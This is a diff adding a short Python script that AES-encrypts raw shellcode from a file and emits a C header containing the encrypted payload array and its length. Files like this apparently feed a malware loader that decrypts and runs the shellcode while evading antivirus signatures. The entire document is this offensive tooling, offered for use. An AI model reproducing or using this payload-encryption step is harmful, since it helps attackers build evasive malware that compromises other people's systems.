@@ -1,0 +1,38 @@
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+import os
+
+# === CONFIG: Set your AES key and IV ===
+key = bytes([
+    0x5f, 0x3d, 0x8c, 0x7a, 0x1e, 0x6b, 0x09, 0xa4,
+    0xc2, 0xf7, 0xe5, 0x90, 0xd2, 0xb4, 0xa6, 0x81,
+    0xf0, 0xd9, 0xe3, 0xc7, 0xb2, 0xa5, 0xd8, 0xf1,
+    0xe4, 0xc6, 0xa9, 0xb3, 0xd0, 0xe7, 0xf8, 0x22
+])
+
+iv = bytes([
+    0x3e, 0x7a, 0x9f, 0x4c, 0x2b, 0x8d, 0x60, 0x15,
+    0xf0, 0xe1, 0x23, 0xd9, 0xa4, 0xc6, 0xb2, 0x87
+])
+
+# === Load shellcode ===
+with open("sc.bin", "rb") as f:
+    shellcode = f.read()
+
+# === Pad and encrypt ===
+cipher = AES.new(key, AES.MODE_CBC, iv)
+padded = pad(shellcode, AES.block_size)
+enc = cipher.encrypt(padded)
+
+# === Generate header ===
+with open("payload.h", "w") as f:
+    f.write("#pragma once\n")
+    f.write(f"unsigned char encryptedPayload[] = {{\n")
+    for i, b in enumerate(enc):
+        f.write(f"0x{b:02x},")
+        if (i + 1) % 16 == 0:
+            f.write("\n")
+    f.write("\n};\n")
+    f.write(f"unsigned int encryptedPayloadLen = {len(enc)};\n")
+
+print(f"[+] payload.h generated with {len(enc)} bytes.")
